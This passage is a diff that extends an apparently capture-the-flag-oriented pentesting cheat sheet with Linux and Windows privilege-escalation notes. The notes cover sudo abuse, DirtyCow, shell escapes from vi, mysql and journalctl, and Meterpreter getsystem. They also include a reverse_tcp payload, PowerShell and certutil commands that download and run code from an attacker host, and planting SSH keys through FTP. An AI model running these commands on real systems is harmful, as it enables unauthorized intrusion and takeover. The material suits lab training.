@@ -645,6 +645,176 @@ To crack encrypted ssh key use `ssh2john` tool.
 - [Pspy](https://github.com/DominicBreuker/pspy) - Information on cronjobs, proceses on target system.
 - [JAWS](https://github.com/411Hall/JAWS) - Windows Enumeration Script.
 - [Cyberchef](https://github.com/gchq/CyberChef) - A web app for encryption, encoding, compression and data analysis.
+- [Pspy](https://github.com/DominicBreuker/pspy) - Gather information on cron, proceses.
+- [Gtfobins](https://gtfobins.github.io/) - If we dont exactly remember how to use a given setuid command to get Privliges.
+
+#### Dirtycow 
+
+On older linux kernals, we can gain root access using dirtycow exploit.
+
+To Use DirtyCow : [Link](https://dirtycow.ninja/) - Maybe more specifically : [Dirty.c](https://github.com/FireFart/dirtycow/blob/master/dirty.c)
+
+#### Sudo 
+
+To check what sudo command can the current user run with no-password.
+
+```
+> $ sudo -l
+```
+
+Examples:
+
+```
+> $ sudo -l
+User www-data may run the following commands on bashed:
+(enemy : enemy) NOPASSWD: ALL
+```
+We can try like below
+```
+> $ sudo -u enemy /bin/bash
+id
+uid=1001(enemy) gid=1001(enemy) groups=1001(enemy)
+```
+
+```
+> $ sudo -l
+[sudo] password for username: 
+Matching Defaults entries for username on Victim:
+  env_reset, mail_badpass,
+  secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+ 
+  User username may run the following commands on Victim:
+    (ALL : ALL) ALL
+> $ cat /root/root.txt
+cat: /root/root.txt: Permission denied  - Does not work
+> $ sudo cat /root/root.txt  - Work
+```
+
+#### Gain More Privilige on windows system
+- In meterpreter shell try `getsystem`
+- In meterpreter shell try `background` and then follow rest of commands.
+- search suggester
+```
+> use post/multi/recon/local_exploit_suggestor
+show options
+set session 1
+run
+```
+- If worked fine, else Try follow rest of commands.
+- Use this link: [FuzzySec Win Priv Exec](https://www.fuzzysecurity.com/tutorials/16.html)
+- Use this method: [Sherlock](https://github.com/rasta-mouse/Sherlock)
+- If current process doesnt own Privs, use `migrate <PID>` to get more Priviliges in Meterpretor.
+
+
+To get Shell on Windows use [Unicorn](https://github.com/trustedsec/unicorn.git)
+```
+> $ /opt/unicorn/unicorn.py windows/meterpreter/reverse_tcp <HOST_IP> 3333 
+[*] Generating the payload shellcode.. This could take a few seconds/minutes as we create the shellcode...
+> $ msfconsole -r unicorn.rc 
+[*] Started reverse TCP handler on <HOST_IP>:3333 
+msf5 exploit(multi/handler) >         
+```
+
+#### MYSQL with Sudo Privilage
+
+To get Shell from MYSQL
+```
+mysql> \! /bin/sh
+```
+
+#### VIM Editor with Sudo Privilage
+
+To get Shell from VIM.
+
+Method-1:
+```
+> $ sudo /usr/bin/vi /var/www/html/../../../root/root.txt
+```
+Method-2:
+
+```
+> $ sudo /usr/bin/vi /var/www/html/anyrandomFile
+Type Escape and enter :!/bin/bash
+```
+
+#### Cronjob
+
+If some system cron is getting some url present in the file, we can replace url to get flag as below.
+```
+> $ cat input 
+url = "file:///root/root.txt"
+```
+
+To monitor cronjobs, we can tail the syslogs.
+```
+> $ tail -f /var/log/syslog
+Nov 18 23:55:01 sun CRON[5327]: (root) CMD (python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py)
+Nov 19 00:00:01 sun CRON[5626]: (root) CMD (python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py)
+Nov 19 00:00:01 sun CRON[5627]: (sun) CMD (nodejs /home/sun/server.js >/dev/null 2>&1)
+Nov 19 00:05:01 sun CRON[5701]: (root) CMD (python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py)
+```
+
+
+#### More or Less Command 
+
+- If any file we found in low priv user and it contains something like this, we can execute it and minimize the size of terminal to enter the visual mode to gain root access.
+
+```
+> $ cat new.sh 
+#!/bin/bash
+/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
+```
+
+```
+> $ sh new.sh 
+-- Logs begin at Sun 2019-11-17 19:19:25 EST, end at Mon 2019-11-18 17:13:44 EST. --
+Nov 18 17:02:26 kali sudo[11538]: pam_unix(sudo:auth): authentication failure; logname= uid=33 eu
+Nov 18 17:02:29 kali sudo[11538]: pam_unix(sudo:auth): conversation failed
+Nov 18 17:02:29 kali sudo[11538]: pam_unix(sudo:auth): auth could not identify password for [www-
+Nov 18 17:02:29 kali sudo[11538]: www-data : command not allowed ; TTY=unknown ; PWD=/tmp ; USER=
+Nov 18 17:02:29 kali crontab[11595]: (www-data) LIST (www-data)
+!/bin/bash
+root # 
+```
+
+#### Improve Shell
+To get the better Shell after taking control of the system.
+```
+www-data@machine:/var/www/html$ python3 -c "import pty;pty.spawn('/bin/bash')"
+<html$ python3 -c "import pty;pty.spawn('/bin/bash')"                        
+www-data@machine:/var/www/html$ ^Z
+[1]+  Stopped                 nc -nlvp 443
+root@kali:# stty raw -echo
+----------------------Here we need to type `fg` and press Enter `Twice`
+root@kali:# nc -nlvp 443 
+www-data@machine:/var/www/html$ export TERM=xterm
+```
+
+#### Transfer Files from Host to Target Machine
+- Use `python -m SimpleHTTPServer` in the host folder.
+- Use Apache and put files in `/var/www/html/` folder.
+- If Tomcat is Opened, upload the file/payload using the Admin panel.
+- If wordpress is running, upload the file as plugin.
+- In Windows Victim, use `certutil -urlcache -f http://<HOST_IP>/<FILE_NAME> <OUTPUT_FILE_NAME>`
+- In Windows, Using Powershell: `PS C:\Users\User\Desktop> IEX(New-Object Net.WebClient).downloadString('http://<HOST_IP>:8000/jaws-enum.ps1')`
+
+
+#### FTP
+
+If we were able to access FTP, we can upload SSH Key to login without password.
+```
+ > $ ftp <HOST_IP>
+Connected to <HOST_IP>.
+220 ProFTPD 1.3.5a Server (Debian) [::ffff:<HOST_IP>]
+Name (<HOST_IP>:root): notch
+331 Password required for notch
+Password:
+230 User notch logged in
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> put id_rsa.pub
+ftp> rename id_rsa.pub authorized_keys
+```
 
 ### Reconnoitre
 Security tool for multithreaded information gathering and service enumeration whilst building directory structures to store results, along with writing out recommendations for further testing.
